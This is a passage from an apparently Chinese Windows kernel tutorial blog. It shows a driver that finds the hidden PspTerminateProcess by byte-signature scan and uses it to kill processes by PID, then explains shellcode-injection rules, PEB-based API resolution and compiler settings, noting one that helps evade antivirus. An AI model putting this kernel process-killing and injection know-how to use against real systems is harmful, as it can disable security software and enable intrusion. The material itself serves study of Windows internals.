class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG TimeDateStamp;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID LoadedImports;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING RegPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ULONG Status;</span><br><span class="line">	ULONG uIndex = <span class="number">0</span>;</span><br><span class="line">	PDEVICE_OBJECT pDeviceObj = <span class="literal">NULL</span>; <span class="comment">// 设备对象指针</span></span><br><span class="line">	UNICODE_STRING DeviceName; <span class="comment">// 设备名，0环用</span></span><br><span class="line">	UNICODE_STRING SymbolicLinkName; <span class="comment">// 符号链接名，3环用</span></span><br><span class="line">	g_pDriver = pDriver;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建设备名称</span></span><br><span class="line">	RtlInitUnicodeString(&amp;DeviceName,DEVICE_NAME);</span><br><span class="line">	<span class="comment">// 创建设备</span></span><br><span class="line">	Status = IoCreateDevice(pDriver,<span class="number">0</span>,&amp;DeviceName,FILE_DEVICE_UNKNOWN,FILE_DEVICE_SECURE_OPEN,FALSE,&amp;pDeviceObj);</span><br><span class="line">	<span class="keyword">if</span> (Status != STATUS_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		IoDeleteDevice(pDeviceObj);</span><br><span class="line">		DbgPrint(<span class="string">&quot;创建设备失败.\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> Status;</span><br><span class="line">	&#125;</span><br><span class="line">	DbgPrint(<span class="string">&quot;创建设备成功.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 设置交互数据的方式</span></span><br><span class="line">	pDeviceObj-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line">	<span class="comment">// 创建符号链接</span></span><br><span class="line">	RtlInitUnicodeString(&amp;SymbolicLinkName, DRIVER_LINK);</span><br><span class="line">	IoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;DeviceName);</span><br><span class="line">	<span class="comment">// 设置分发函数</span></span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_CREATE] = IrpCreateProc;</span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_CLOSE] = IrpCloseProc;</span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceControlProc;</span><br><span class="line">	<span class="comment">// 设置卸载函数</span></span><br><span class="line">	pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载驱动</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UNICODE_STRING SymbolicLinkName;</span><br><span class="line">	<span class="comment">// 删除符号链接，删除设备</span></span><br><span class="line">	RtlInitUnicodeString(&amp;SymbolicLinkName, DRIVER_LINK);</span><br><span class="line">	IoDeleteSymbolicLink(&amp;SymbolicLinkName);</span><br><span class="line">	IoDeleteDevice(pDriver-&gt;DeviceObject);</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动卸载成功\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不设置这个函数，则Ring3调用CreateFile会返回1</span></span><br><span class="line"><span class="comment">// IRP_MJ_CREATE 处理函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCreateProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;应用层连接设备.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 返回状态如果不设置，Ring3返回值是失败</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IRP_MJ_CLOSE 处理函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCloseProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;应用层断开连接设备.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 返回状态如果不设置，Ring3返回值是失败</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IRP_MJ_DEVICE_CONTROL 处理函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpDeviceControlProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// DbgPrint(&quot;IrpDeviceControlProc.\n&quot;);</span></span><br><span class="line">	NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;</span><br><span class="line">	PIO_STACK_LOCATION pIrpStack;</span><br><span class="line">	ULONG uIoControlCode;</span><br><span class="line">	PVOID pIoBuffer;</span><br><span class="line">	ULONG uInLength;</span><br><span class="line">	ULONG uOutLength;</span><br><span class="line">	ULONG uRead1;</span><br><span class="line">	ULONG uWrite1;</span><br><span class="line">	ULONG uWrite2;</span><br><span class="line">	BOOLEAN bRet = FALSE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置临时变量的值</span></span><br><span class="line">	uRead1 = <span class="number">0</span>;</span><br><span class="line">	uWrite1 = <span class="number">1</span>;</span><br><span class="line">	uWrite2 = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 获取IRP数据</span></span><br><span class="line">	pIrpStack = IoGetCurrentIrpStackLocation(pIrp);</span><br><span class="line">	<span class="comment">// 获取控制码</span></span><br><span class="line">	uIoControlCode = pIrpStack-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line">	<span class="comment">// 获取缓冲区地址（输入输出是同一个）</span></span><br><span class="line">	pIoBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">	<span class="comment">// Ring3 发送数据的长度</span></span><br><span class="line">	uInLength = pIrpStack-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">	<span class="comment">// Ring0 发送数据的长度</span></span><br><span class="line">	uOutLength = pIrpStack-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (uIoControlCode)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> OPERADD:</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// 读取缓冲区</span></span><br><span class="line">			<span class="built_in">memcpy</span>(&amp;uRead1,pIoBuffer,<span class="number">4</span>);</span><br><span class="line">			<span class="comment">//执行结束进程</span></span><br><span class="line">			bRet = KillProc(g_pDriver,uRead1);</span><br><span class="line">			<span class="keyword">if</span>(bRet == TRUE)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">// 写入缓冲区</span></span><br><span class="line">				<span class="built_in">memcpy</span>(pIoBuffer, &amp;uWrite1, <span class="number">4</span>);</span><br><span class="line">			&#125;<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">// 写入缓冲区</span></span><br><span class="line">				<span class="built_in">memcpy</span>(pIoBuffer, &amp;uWrite2, <span class="number">4</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// 设置状态</span></span><br><span class="line">			pIrp-&gt;IoStatus.Information = <span class="number">4</span>;</span><br><span class="line">			status = STATUS_SUCCESS;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 返回状态如果不设置，Ring3返回值是失败</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = status;</span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOLEAN <span class="title">KillProc</span><span class="params">(PDRIVER_OBJECT driver,ULONG uPID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ULONG ulShellCode[] =</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="number">0x0124a164</span>, <span class="number">0x758b0000</span>, <span class="number">0x44703b08</span>, <span class="number">0x0db80775</span>,</span><br><span class="line">		<span class="number">0xebc00000</span>, <span class="number">0xbe8d575a</span>, <span class="number">0x00000248</span>, <span class="number">0x200147f6</span>,</span><br><span class="line">		<span class="number">0x868d1274</span>, <span class="number">0x00000174</span></span><br><span class="line">	&#125;;</span><br><span class="line">	ULONG ulRet = <span class="number">0</span>;</span><br><span class="line">	PVOID DllBase = <span class="literal">NULL</span>;</span><br><span class="line">	ULONG SizeOfImage = <span class="number">0</span>;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(*_PspTerminateProcess)</span><span class="params">(PEPROCESS pEprocess, NTSTATUS ExitCode)</span></span>;</span><br><span class="line">	_PspTerminateProcess PspTerminateProcess;</span><br><span class="line">	PEPROCESS pEprocess = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	ulRet = GetKernelMoudleInfo(driver,&amp;DllBase,&amp;SizeOfImage);</span><br><span class="line">	<span class="keyword">if</span>(!ulRet)</span><br><span class="line">	&#123;</span><br><span class="line">		DbgPrint(<span class="string">&quot;驱动程序获取ntoskrnl.exe模块失败.\r\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	PspTerminateProcess = (_PspTerminateProcess)Find_FeatureCode((PVOID)ulShellCode,<span class="keyword">sizeof</span>(ulShellCode),DllBase,SizeOfImage);</span><br><span class="line">	<span class="keyword">if</span>(!PspTerminateProcess)</span><br><span class="line">	&#123;</span><br><span class="line">		DbgPrint(<span class="string">&quot;PspTerminateProcess特征码搜索失败.\r\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PsLookupProcessByProcessId((HANDLE)uPID,&amp;pEprocess); <span class="comment">// 记事本PID</span></span><br><span class="line">	PspTerminateProcess(pEprocess, <span class="number">0</span>);</span><br><span class="line">	DbgPrint(<span class="string">&quot;PID为%d的进程被 PspTerminateProcess 函数关闭了.\r\n&quot;</span>,uPID);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ULONG <span class="title">GetKernelMoudleInfo</span><span class="params">(IN PDRIVER_OBJECT pDriver,OUT PVOID* DllBase,OUT PULONG SizeOfImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pLDR_Head = <span class="literal">NULL</span>;</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pLDR_Tail = <span class="literal">NULL</span>;</span><br><span class="line">	UNICODE_STRING UnicodeMoudleName = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	</span><br><span class="line">	RtlInitUnicodeString(&amp;UnicodeMoudleName,<span class="string">L&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">	pLDR_Head = (PLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection;</span><br><span class="line">	pLDR_Tail = pLDR_Head;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(RtlCompareUnicodeString(&amp;pLDR_Tail-&gt;BaseDllName, &amp;UnicodeMoudleName, TRUE) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			*DllBase = pLDR_Tail-&gt;DllBase;</span><br><span class="line">			*SizeOfImage = pLDR_Tail-&gt;SizeOfImage;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//pLDR_Blink = (PLDR_DATA_TABLE_ENTRY)CONTAINING_RECORD(pLDR_Flink,LDR_DATA_TABLE_ENTRY,InLoadOrderLinks);</span></span><br><span class="line">		pLDR_Tail = (PLDR_DATA_TABLE_ENTRY)pLDR_Tail-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(pLDR_Head != pLDR_Tail);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">PVOID <span class="title">Find_FeatureCode</span><span class="params">(PVOID pShellCode,ULONG ulShellCode_Len,PVOID DllBase,ULONG ulSizeOfImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ULONG ulDllLastByte = <span class="number">0</span>;</span><br><span class="line">	PVOID pNextByte = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	pNextByte = DllBase;</span><br><span class="line">	ulDllLastByte = (ULONG)DllBase + ulSizeOfImage;</span><br><span class="line">	<span class="keyword">while</span>((ULONG)pNextByte + ulShellCode_Len &lt;= ulDllLastByte)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(RtlCompareMemory(pNextByte,pShellCode,ulShellCode_Len) == ulShellCode_Len)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> (PVOID)((ULONG)pNextByte - <span class="number">6</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		pNextByte = (PVOID)((ULONG)pNextByte + <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="2-驱动中的全局变量"><a href="#2-驱动中的全局变量" class="headerlink" title="2 驱动中的全局变量"></a>2 驱动中的全局变量</h2><p>在编写驱动中发现，使用全局变量或<code>static</code>变量，<strong>它们的地址是会变的</strong>，像局部变量一样，全局变量每次调用驱动函数都会重新初始化。</p>
<p>在驱动程序中应该尽量避免使用全局变量，因为全局变量会导致不同步的问题，解决办法之一就是可将全局变量存储在设备扩展中（使用指针指向设备扩展的内存块），将指针作为一个全局变量来使用。</p>
<div class="note primary"><p>设备扩展（DEVICE_EXTENSION）是与设备对象相关的另一种重要的数据结构。可以用它来保存与特定设备关联的信息。设备扩展其实只是一个未分页的池，由驱动开发者来定义它的大小和内容。并由I&#x2F;O管理器自动把它分配给设备对象，即设备对象的<code>PVOID DeviceExtension</code>字段。由于此结构是驱动开发者自定义的，所以必须要让系统知道需要给此结构预留多少空间，因此要把设备扩展结构的大小作为参数传递给<code>IoCreateDevice</code>函数。I&#x2F;O管理器的<code>IoCreateDevice</code>函数将为设备对象和设备扩展对象在非分页内存池内申请内存。</p>
<ul>
<li><mark class="label warning">非分页内存池</mark>：内存页<mark class="label danger">不可以</mark>交换出内存。</li>
<li><mark class="label default">分页内存池</mark>：内存页可以交换出内存。</li>
</ul>
</div>

<p>使用<code>IoCreateDevice</code>函数创建设备时，可以指定当前设备要使用的非分页内存的大小，由成员<code>DeviceExtensionSize</code>来指定大小。然后由对象的成员<code>DeviceExtension</code>指向这块内存。这块内存本来是用来存设备相关信息的，但是可以由开发者决定存啥，将其转为<code>PVOID</code>使用即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">IoCreateDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           PDRIVER_OBJECT  DriverObject,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           ULONG           DeviceExtensionSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in, optional] PUNICODE_STRING DeviceName,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           DEVICE_TYPE     DeviceType,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           ULONG           DeviceCharacteristics,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           BOOLEAN         Exclusive,</span></span></span><br><span class="line"><span class="function"><span class="params">  [out]          PDEVICE_OBJECT  *DeviceObject</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> &#123;</span></span><br><span class="line">  CSHORT             Type;</span><br><span class="line">  CSHORT             Size;</span><br><span class="line">  PDEVICE_OBJECT     DeviceObject;</span><br><span class="line">  ULONG              Flags;</span><br><span class="line">  PVOID              DriverStart;</span><br><span class="line">  ULONG              DriverSize;</span><br><span class="line">  PVOID              DriverSection;</span><br><span class="line">  PDRIVER_EXTENSION  DriverExtension;</span><br><span class="line">  UNICODE_STRING     DriverName;</span><br><span class="line">  PUNICODE_STRING    HardwareDatabase;</span><br><span class="line">  PFAST_IO_DISPATCH  FastIoDispatch;</span><br><span class="line">  PDRIVER_INITIALIZE DriverInit;</span><br><span class="line">  PDRIVER_STARTIO    DriverStartIo;</span><br><span class="line">  PDRIVER_UNLOAD     DriverUnload;</span><br><span class="line">  PDRIVER_DISPATCH   MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + <span class="number">1</span>];</span><br><span class="line">&#125; DRIVER_OBJECT, *PDRIVER_OBJECT;</span><br></pre></td></tr></table></figure>



<h2 id="3-编写ShellCode"><a href="#3-编写ShellCode" class="headerlink" title="3 编写ShellCode"></a>3 编写ShellCode</h2><h3 id="3-1-ShellCode定义"><a href="#3-1-ShellCode定义" class="headerlink" title="3.1 ShellCode定义"></a>3.1 ShellCode定义</h3><p>Shellcode是不依赖环境，放到任何地方都可以执行的机器码。</p>
<p>将一个函数模块注入到其他进程中，这个函数的硬编码就成为ShellCode，这种注入叫做代码注入&#x2F;ShellCode注入</p>
<h3 id="3-2-ShellCode编写原则"><a href="#3-2-ShellCode编写原则" class="headerlink" title="3.2 ShellCode编写原则"></a>3.2 ShellCode编写原则</h3><p>ShellCode编写原则有很多，下面列举一些必须要掌握的。</p>
<div class="note danger"><p>关于ShellCode注入应该注意（编写规则）：<br>1、不要使用全局变量（当前程序的全局变量地址在其他进程不可用）<br>2、不要使用常量字符串（全局变量）<br>3、不能直接调用系统函数（不能使用IAT）<br>4、不能嵌套调用其他函数(全局变量)<br>5、<a href="https://www.cnblogs.com/thresh/p/12609659.html">注意编译器的一些设置</a></p>
</div>

<p><strong>1、不要使用全局变量。</strong></p>
<p>因为我们编写ShellCode时，使用的全局变量是自己的进程里面的全局变量，注入到别的进程里，这个地址就没用了。</p>
<p><strong>2、不要使用常量字符串</strong>。</p>
<p>因为字符串常量值也是<strong>全局变量</strong>，注入到别的进程里，根本没有这个字符串。</p>
<p><strong>⚠️替代方法</strong>：要使用字符串，请使用字符数组。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> s[] = &#123;<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="number">0</span>&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>3、不能直接调用系统函数（不能使用IAT）。</strong></p>
<p>如在程序中使用<code>MessageBox(0,0,0,0)</code>，调用系统函数的方式是间接调用（FF15），需要从IAT表里获取API地址，每个进程的IAT表位置不同，且对方的进程可能没有导入你需要调用的函数的DLL，那么你是不能调用这个系统函数的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0040227B</span>	FF15 <span class="number">44</span>C14000 call dword ptr ds:[<span class="number">0x40C144</span>]</span><br></pre></td></tr></table></figure>

<p>这里的<code>0x40C144</code>就是<strong>全局变量</strong>的地址。</p>
<p>所以我们需要用到 LoadLibrary 和 GetProcAddress 这两个函数，来动态获取系统API的函数指针。</p>
<p>但是 LoadLibrary，GetProcAddress 本身就是系统函数，它们本身就依赖IAT表，咋办呢？</p>
<p>解决方案是这样的：通过FS:[0x30] 找到PEB，然后通过PEB里的LDR链表 [PEB+0x0C]找到 kernel32.dll 的地址，然后我们遍历它的 IAT表，找到 LoadLibrary 和 GetProcAddress 函数。</p>
<p><strong>4、不能嵌套调用其他函数。</strong><br>和前两点道理是一样的，本进程里的函数地址，拿到别的进程的虚拟地址空间是无效的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> Num = Plus(<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">call <span class="number">004027B</span>0</span><br></pre></td></tr></table></figure>

<p>这里的<code>0x004027B0</code>即为<code>Plus</code>的地址，是一个<strong>全局变量</strong>。</p>
<p><strong>5、注意编译器的一些设置。</strong>（《Rootkit：系统灰色地带的潜伏者 第2版》）</p>
<p><img data-src="https://s2.loli.net/2022/01/22/apg2ktFxdJiQN3U.png" alt="31.png"></p>
<p>特别注意：</p>
<ul>
<li>运行时检查：可以设置成关闭，或者代码编译时选择<code>release</code>，这样就不会有堆栈检查<code>_checksp</code>函数。</li>
<li>关闭缓冲区安全检查（GS选项）：ShellCode中没有这些信息，方便免杀。</li>
</ul>
<p>可以参考：</p>
<ul>
<li><a href="https://blog.csdn.net/Kwansy/article/details/116261142">关闭生成调试信息和嵌入清单</a></li>
<li><a href="https://blog.csdn.net/Kwansy/article/details/112957763?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164278456416781685371117%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=164278456416781685371117&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-112957763.nonecase&utm_term=DEP&spm=1018.2226.3001.4450">&#x2F;GS 编译选项，_security_cookie，软件强制DEP</a></li>
<li><a href="https://blog.csdn.net/Kwansy/article/details/112919717">使数据区“可执行”的几种常规办法</a></li>
<li><a href="https://www.anquanke.com/post/id/222280#h2-0">Windows下Shellcode开发</a></li>
</ul>
<div class="note primary"><p>代码注入：（原理都是线程注入）<br><strong>⚠️注意</strong>：类型定义不属于全局变量！！！</p>
</div>




<h3 id="3-3-ShellCode示例"><a href="#3-3-ShellCode示例" class="headerlink" title="3.3 ShellCode示例"></a>3.3 ShellCode示例</h3><p>本例编写一个函数，该函数：</p>
<ol>
<li>利用<code>fs:[30]</code>获取PEB起始地址。</li>
<li>根据<code>PEB-&gt;InLoadOrderModuleList.Flink;</code>获取<code>PLDR_DATA_TABLE_ENTRY</code>。</li>
<li>根据Unicode结构<code>BaseDllName</code>和Unicode模块名称<code>kernel32.dll</code>进行对比获取模块加载基址。</li>
<li>根据<code>kernel32.dll</code>的基址获取导出表中的函数<code>GetProcAddress</code>的地址。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核Unicode字符串</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> &#123;</span></span><br><span class="line">	USHORT Length;</span><br><span class="line">	USHORT MaximumLength;</span><br><span class="line">	PWSTR  Buffer;</span><br><span class="line">&#125; UNICODE_STRING, *PUNICODE_STRING;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Length;</span><br><span class="line">    BOOLEAN Initialized;</span><br><span class="line">    PVOID SsHandle;</span><br><span class="line">    LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">    LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">    PVOID EntryInProgress; </span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">     LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">     LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">     PVOID DllBase;</span><br><span class="line">     PVOID EntryPoint;</span><br><span class="line">     ULONG SizeOfImage;</span><br><span class="line">     UNICODE_STRING FullDllName;</span><br><span class="line">     UNICODE_STRING BaseDllName;</span><br><span class="line">     ULONG Flags;</span><br><span class="line">     WORD LoadCount;</span><br><span class="line">     WORD TlsIndex;</span><br><span class="line">     <span class="comment">//后面的成员暂时用不到，就不列举了</span></span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="comment">//线程处理函数，回调函数</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ShellCode</span><span class="params">(LPVOID lpThreadParameter)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span> <span class="params">(WINAPI *PLOADLIBRARYA)</span><span class="params">(LPCSTR)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span> <span class="params">(WINAPI *PGETPROCADDRESS)</span><span class="params">(HMODULE, LPCSTR)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span> <span class="params">(WINAPI *PMESSAGEBOXA)</span><span class="params">(HWND, LPCSTR,LPCSTR,UINT)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TOUPPER(x) ((((x)&gt;=<span class="meta-string">&#x27;a&#x27;</span>)&amp;&amp;((x)&lt;=<span class="meta-string">&#x27;z&#x27;</span>))?((x)-32):(x))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TOLOWER(x) ((((x)&gt;=<span class="meta-string">&#x27;A&#x27;</span>)&amp;&amp;((x)&lt;=<span class="meta-string">&#x27;Z&#x27;</span>))?((x)+32):(x))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	CreateThread(<span class="number">0</span>,<span class="number">0</span>,ShellCode,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ShellCode</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PPEB_LDR_DATA Ldr = <span class="literal">NULL</span>;</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY Ldte = <span class="literal">NULL</span>;</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY Head = <span class="literal">NULL</span>;</span><br><span class="line">	PGETPROCADDRESS pGetProcAddress = <span class="literal">NULL</span>;</span><br><span class="line">	PLOADLIBRARYA pLoadLibraryA = <span class="literal">NULL</span>;</span><br><span class="line">	PMESSAGEBOXA pMessageBoxA = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> szKernel32[] = &#123;<span class="string">&#x27;k&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;e&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;r&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;e&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;l&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;3&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;2&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;.&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;d&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;l&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;l&#x27;</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;; <span class="comment">// Unicode</span></span><br><span class="line">	<span class="keyword">char</span> szUser32[] = &#123;<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span 